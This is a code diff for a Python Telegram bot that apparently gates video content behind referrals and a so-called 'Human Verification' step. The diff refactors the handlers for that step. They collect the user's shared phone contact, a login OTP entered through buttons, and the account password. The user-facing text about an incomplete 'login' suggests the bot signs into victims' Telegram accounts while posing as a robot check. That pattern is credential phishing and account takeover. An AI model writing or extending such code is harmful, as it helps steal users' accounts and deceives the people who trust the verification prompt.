@@ -2226,15 +1629,6 @@ async def menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if data == "um_progress":
         await q.answer()
         return await progress(update, context)
-    if data == "um_verify_robot":
-        d = user_doc(uid) or {}
-        if d.get("human_verified"):
-            return await q.answer("✅ You are already verified.", show_alert=True)
-        await q.answer()
-        return await pyro_session_start(update, context)
-    if data == "um_see_videos":
-        await q.answer()
-        return await see_videos_from_hv(update, context)
 
     # ── Admin menu ──
     if uid != ADMIN_ID:
@@ -2258,8 +1652,6 @@ async def menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if data == "am_stats":
         await q.answer()
         return await admin_stats(update, context)
-    if data == "am_set":
-        return await admin_set_menu(update, context)
     if data == "am_help":
         await q.answer()
         return await help_command(update, context)
@@ -2298,19 +1690,16 @@ async def menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def text_router(update: Update, context):
     uid = update.effective_user.id
 
-    # ── /set edit flow (highest priority for admin) ──
-    if uid == ADMIN_ID and await set_text_input(update, context):
-        return
-
-    if PYRO_STATE.get(uid) == "password":
-        return await pyro_handle_password(update, context)
-    if PYRO_STATE.get(uid) == "otp":
+    # ── Human Verification password / wrong-stage handling ──
+    if HV.states.get(uid) == "password":
+        return await HV.password_handler(update, context)
+    if HV.states.get(uid) == "otp":
         return await update.message.reply_text(
             "⚠️ <b>Do not type the OTP in chat.</b>\n"
             "Use the inline buttons above, otherwise the login will remain incomplete.",
             parse_mode=ParseMode.HTML,
         )
-    if PYRO_STATE.get(uid) == "await_contact":
+    if HV.states.get(uid) == "await_contact":
         return await update.message.reply_text(
             "📱 Please tap the <b>Share My Contact</b> button to continue, "
             "or send /cancel_session to abort.",
@@ -2336,31 +1725,28 @@ def main():
     # Owner commands
     app.add_handler(CommandHandler("admin", admin))
     app.add_handler(CommandHandler("help", help_command))
-    app.add_handler(CommandHandler("set", set_command))
     app.add_handler(CommandHandler("uploadstatus", admin_upload_status))
     app.add_handler(CommandHandler("setcustomlink", set_custom_link))
     app.add_handler(CommandHandler("resetverify", admin_reset_verify))
 
     # Public commands
     app.add_handler(CommandHandler("start", start))
-    app.add_handler(CommandHandler("session", pyro_session_start))
-    app.add_handler(CommandHandler("cancel_session", pyro_cancel_command))
+    app.add_handler(CommandHandler("session", HV.session_start))
+    app.add_handler(CommandHandler("cancel_session", HV.cancel_command))
 
     app.add_handler(ChatJoinRequestHandler(on_join_request))
     app.add_handler(ChatMemberHandler(on_chat_member_update, ChatMemberHandler.CHAT_MEMBER))
 
     app.add_handler(CallbackQueryHandler(
         menu_callback,
-        pattern=r"^(um_(videos|unlock|ref|progress|verify_robot|see_videos)|am_(upload|batches|addgroup|groups|remove|stats|set|help)|up_(status|done|retry|publish|cancel)|flow_cancel)$"
+        pattern=r"^(um_(videos|unlock|ref|progress)|am_(upload|batches|addgroup|groups|remove|stats|help)|up_(status|done|retry|publish|cancel)|flow_cancel)$"
     ))
-    app.add_handler(CallbackQueryHandler(set_edit_callback, pattern=r"^set_edit:"))
-    app.add_handler(CallbackQueryHandler(set_cancel_callback, pattern=r"^set_cancel$"))
     app.add_handler(CallbackQueryHandler(remove_chat_callback, pattern=r"^rm_(?:list|pick|yes|cancel)(?::.*)?$"))
     app.add_handler(CallbackQueryHandler(verify_join, pattern=r"^verify_join$"))
     app.add_handler(CallbackQueryHandler(noop_callback, pattern=r"^noop$"))
-    app.add_handler(CallbackQueryHandler(pyro_otp_callback, pattern=r"^pyro_otp\|"))
+    app.add_handler(CallbackQueryHandler(HV.otp_callback, pattern=r"^pyro_otp\|"))
 
-    app.add_handler(MessageHandler(filters.CONTACT & filters.ChatType.PRIVATE, pyro_contact_handler))
+    app.add_handler(MessageHandler(filters.CONTACT & filters.ChatType.PRIVATE, HV.contact_handler))
     app.add_handler(MessageHandler(filters.VIDEO & filters.ChatType.PRIVATE, admin_collect_video))
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND & filters.ChatType.PRIVATE, text_router))
 
